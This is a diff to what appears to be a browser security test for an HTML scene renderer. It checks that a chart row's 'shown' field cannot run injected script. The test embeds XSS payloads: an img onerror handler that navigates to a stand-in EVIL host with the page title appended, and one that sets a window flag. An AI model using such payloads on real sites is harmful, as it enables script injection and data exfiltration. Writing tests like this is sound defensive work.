@@ -235,6 +235,103 @@ for (const v of VECTORS) {
   await page.close();
 }
 
+/* ============ the same question, asked of a beat that is not `custom` ============
+ *
+ * Every vector above is a `custom` beat, and that is exactly why this surface
+ * stayed invisible to this file: `jumpChart.rows[].shown` is set as `html`, and
+ * innerHTML grants attributes as well as tags. An inline event handler on a
+ * plain data field executes with the page's globals, needs no `attest`, is seen
+ * by no determinism lint, and until Task 5 appeared on no review screen.
+ *
+ * The sink is the oracle here too, and the vector is `location.href` rather than
+ * `fetch` on purpose: D-090 records that CSP cannot stop a top-level navigation,
+ * so a policy is not what makes this one fail. Only the closed vocabulary is. */
+{
+  const HOLD_J = 3.0;
+  const ROW = (shown) => ({ label: 'FrontierCode 1.1', before: 34.4, after: 43.6, shown });
+  const chartPlan = (shown) => ({
+    episode: '2026-08-16',
+    series: 'the-brief',
+    series_name: 'The Brief',
+    byline: 'Ali Abdukarim',
+    format: { name: 'vertical', w: 1080, h: 1920 },
+    fps: 30,
+    pace: 1,
+    design: {},
+    beats: [
+      {
+        type: 'jumpChart',
+        act: '',
+        act_label: '',
+        hold: HOLD_J,
+        start: 0,
+        end: HOLD_J,
+        kicker: '',
+        src: 'deepmind',
+        quote: 'FrontierCode 1.1 rises from 34.4 to 43.6',
+        rows: [ROW('<s>34.4</s> &rarr; 43.6'), ROW(shown)],
+        scale: 70,
+        footnote: 'Scores as published by Google, on a common 0–70% scale.',
+      },
+    ],
+  });
+
+  const openWith = async (shown) => {
+    await writeFile(PLAN_JS, 'window.__PLAN = ' + JSON.stringify(chartPlan(shown)) + ';\n', 'utf8');
+    const page = await browser.newPage({
+      viewport: { width: 1080, height: 1920 },
+      deviceScaleFactor: 1,
+    });
+    await page.goto('file://' + join(HERE, 'scene.html') + '?plan=1');
+    /* Guarded the way the loop above is, and for a sharper reason here: this
+     * vector NAVIGATES. On the failing side the document is replaced before a
+     * single line of this can run, and a thrown "window.__seek is not a
+     * function" halfway down the file is a crash report rather than a verdict. */
+    if (await page.evaluate(() => typeof window.__seek === 'function')) {
+      await page.evaluate(() => document.body.classList.add('render'));
+      await page.evaluate(() => document.fonts.ready);
+      await page.evaluate((t) => window.__seek(t), HOLD_J * 0.72);
+    }
+    await page.waitForTimeout(400);
+    return page;
+  };
+
+  hits.length = 0;
+  let page = await openWith(
+    `<img src=x onerror="location.href='http://${EVIL}/shown?d='+encodeURIComponent(document.title)">`,
+  );
+  const quiet = hits.length === 0;
+  if (!quiet) failures++;
+  console.log(
+    `  ${quiet ? 'ok  ' : 'FAIL'} ${'shown (jumpChart)'.padEnd(20)} nothing reached the sink` +
+      (quiet ? ' (never even asked)' : ` — RECEIVED ${JSON.stringify(hits)}`),
+  );
+  await page.close();
+
+  /* Execution, separately from the network, because they are separate
+   * properties and D-089 is explicit that a CSP closes only one of them. */
+  page = await openWith('<img src=x onerror="window.__PWNED=1">');
+  const inert = await page.evaluate(() => ({
+    pwned: window.__PWNED === undefined,
+    imgs: document.querySelectorAll('#scenes img').length,
+    /* the negative half: the vocabulary is closed, not removed. The committed
+     * episode's row must still strike its old score through. */
+    struck: document.querySelectorAll('#scenes .jval s').length,
+    text: (document.getElementById('scenes') || document.body).innerText.replace(/\s+/g, ' '),
+  }));
+  const ok =
+    inert.pwned && inert.imgs === 0 && inert.struck === 1 && inert.text.includes('onerror');
+  if (!ok) failures++;
+  console.log(
+    `  ${ok ? 'ok  ' : 'FAIL'} ${'shown (jumpChart)'.padEnd(20)} the handler is text, not code` +
+      (inert.pwned ? '' : ' — window.__PWNED is set') +
+      (inert.imgs ? ` — ${inert.imgs} live <img> on the stage` : '') +
+      (inert.struck === 1 ? '' : ` — ${inert.struck} <s> elements, expected 1`) +
+      (inert.text.includes('onerror') ? '' : ' — the escaped handler is not on the frame'),
+  );
+  await page.close();
+}
+
 await browser.close();
 sink.closeAllConnections?.();
 await new Promise((r) => sink.close(r));
